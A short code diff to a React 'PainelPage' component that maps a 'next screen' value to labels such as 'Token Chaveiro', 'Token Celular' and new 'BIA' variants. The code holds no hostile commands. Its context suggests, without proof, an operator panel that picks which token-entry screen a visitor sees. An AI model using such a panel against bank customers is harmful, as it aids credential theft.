@@ -334,7 +334,13 @@ function PainelPage() {
               ? "Token Chaveiro"
               : v.proxima_tela === "sucesso"
                 ? "Sucesso"
-                : "Token Celular"
+                : v.proxima_tela === "interna"
+                  ? "BIA"
+                  : v.proxima_tela === "interna_token_celular"
+                    ? "BIA Token Celular"
+                    : v.proxima_tela === "interna_token_chaveiro"
+                      ? "BIA Token Chaveiro"
+                      : "Token Celular"
         }.`,
       );
       invalidar();
